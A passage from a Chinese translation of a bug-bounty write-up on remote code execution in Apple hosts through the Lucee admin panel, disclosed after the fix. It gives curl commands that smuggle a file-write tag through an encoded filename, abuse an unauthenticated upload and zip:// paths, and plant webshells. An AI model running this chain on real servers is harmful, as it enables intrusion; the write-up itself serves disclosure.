最后，这些键（即 **searchresults** 变量）以JSON格式存储在 **dataDir** 目录内名为 **“
searchindex.cfm”** 的文件中。
## 在Facilities.apple.com上执行远程代码
如果您没有弄清楚, 这时我们可以通过`imgProcess.cfm`
和`admin.search.index.cfm`结合来在[https://facilities.apple.com](https://facilities.apple.com/)
有个不错的rce。
我们已经可以控制一个复制文件到( **dataDir** 参数)的目录和可以指定一个目录从（ **luceeArchiveZipPath**
参数）复制文件。
现在，如果可以在服务器某处上创建一个名称为`server..cfm`,内容则是`"#stText.x.f#"`的文件，则可以通过
**luceeArchiveZipPath** 将其路径 **传递**
给`admin.search.index.cfm`。由于此关键`server..cfm`不存在，将创建它并将其写入名为 **searchindex.cfm**
的文件中。这意味着我们可以在使用 **dataDir** 参数指定的任何目录中的 **searchindex.cfm**
文件中控制CFML标签（类似于PHP标签），这意味着我们可以使用webroot路径在服务器上执行代码！
我们可以利用 `imgProcess.cfm` 来在目标的文件系统上创建一个`server..cfm`文件，其内容与RegExp相匹配`[''"##]stText\..+?[''"##]`。
这种尝试不会触发WAF，因为我部正在这里进行路径穿越。
### 取得shell的步骤
  * 创建一个带有`"#stText.x.f#"`(以匹配正则表达式)的内容，名称为`server..cfm`的文件,我们需要对文件名进行URLencode编码，因为后端(tomcat)不喜欢某些字符。
    curl -X POST 'https://facilities.apple.com/lucee/admin/imgProcess.cfm?file=%2F%73%65%72%76%65%72%2e%3c%63%66%66%69%6c%65%20%61%63%74%69%6f%6e%3d%77%72%69%74%65%20%66%69%6c%65%3d%23%55%72%6c%5b%27%66%27%5d%23%20%6f%75%74%70%75%74%3d%23%55%72%6c%5b%27%63%6f%6e%74%65%6e%74%27%5d%23%3e%2e%63%66%6d' --data 'imgSrc="#stText.Buttons.save#"'
  * 复制文件名以准备执行代码
    curl 'http://facilities.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/context/rootxharsh/&LUCEEARCHIVEZIPPATH=/full/path/lucee/temp/admin-ext-thumbnails/__/'
  * 编写shell触发代码执行
    curl https://facilities.apple.com/lucee/rootxharsh/searchindex.cfm?f=PoC.cfm&content=cfm_shell
  * 访问webshell- [https:](https://facilities.apple.com/lucee/rootxharsh/PoC.cfm) //facilities.apple.com/lucee/rootxharsh/PoC.cfm
## 但是，其他主机呢？
由于`imgProcess.cfm`在较早的版本中不可用，因此我们必须找到其他方法才能在其他两个主机上获得RCE。我们遇到了另一种巧妙的方法;）。
### 未经身份验证的.lex文件上传
`ext.applications.upload.cfm`部分未经身份验证。该代码段非常简单。我们需要传递带有`.lex`
文件名扩展名的form参数`extfile`，否则我们将收到异常。
        ...
            ...
对于`.lex`后缀，我们可以看这段代码：
    ...
            type="#request.adminType#"
    ...
因为我们没有`request.admintype`设置，所以会导致异常。但是，我们的文件仍在上传之前上传，可以在这里确认：
`.lex`文件其实不过是一种`.lex`后缀的归档或zip文件，这实际上是Lucee的扩展名格式，也是我们允许上传的。另外，由于不检查内容，因此我们可以将其设置为任何内容。
### 利用要点
通过把玩Lucee,我们知道它允许使用协议或schemes,利用zip://,file://等(我们在此利用链中使用)，因此我们可以在文件系统功能受到完全控制的任何地方指定这schemes输入（比如在这种情况下的
**luceeArchiveZipPath** ）。
现在，我们可以利用`ext.applications.upload.cfm`创建`.lex`文件，它是包含一个文件名为`server..cfm`和`"#stText.x.f#"`作为内容的ZIP档案。
一旦将ZIP存档保存在文件系统上，就可以使用 **luceeArchiveZipPath** 变量中的 **zip://**
在ZIP存档中查询`*.*.cfm`文件;
### 在其他2台主机上获取Shell
  * 创建一个以`server..cfm`命名且内容`"#stText.x.f#"`的文件，并将其压缩为`payload.lex`。
  * 在之前提到过 `ext.applications.upload.cfm`未认证处上传`.lex`文件
`curl -vv -F extfile=@payload.lex
https://booktravel.apple.com/lucee/admin/ext.applications.upload.cfm`
  * 在文件系统部署了任意的`.lex`(zip存档)和zip://方案后，我们可以执行一下操作。
`curl
https://booktravel.apple.com/lucee/admin/admin.search.index.cfm?dataDir=/full/path/lucee/web/context/exploit/&luceeArchiveZipPath=zip:///full/path/lucee/web/temp/payload.lex`
  * 现在，我们名为`server..cfm`的文件已作为文本添加到`//context/exploit/`下面的 **searchindex.cfm** 文件中，我们可以通过以下方式访问它`https://booktravel.apple.com//exploit/searchindex.cfm`
  * 向[https://booktravel.apple.com/lucee/exploit/searchindex.cfm?f=test.cfm&output=cfml_shell发出请求将创建我们的webshell](https://booktravel.apple.com/lucee/exploit/searchindex.cfm?f=test.cfm&output=cfml_shell发出请求将创建我们的webshell)
  * Webshell : 
由于存在负载均衡，因此我们不得不使用intruder来找到我们的shell 。
## 结论
Apple迅速解决了该问题，但要求我们在进行其他更改之前不要披露此问题。对于这些问题，Apple给予我们总计50,000美元的奖励。
另一方面，我们和苹果也与Lucee进行了交谈。Lucee团队还通过限制直接访问cfm文件（这是[commit链接）](https://github.com/lucee/Lucee/commit/6208ab7c44c61d26c79e0b0af10382899f57e1ca)来修复该错误。不过，我们仍在等待CVE分配。
强烈要求Apple产品安全团队保持透明并允许披露本文内容！
如果您有任何疑问，请通过[@rootxharsh](https://twitter.com/rootxharsh)＆[@iamnoooob](https://twitter.com/iamnoooob)
ping我们。
感谢您的阅读，祝您度过愉快的一年！
> 本文为翻译文章，原文链接: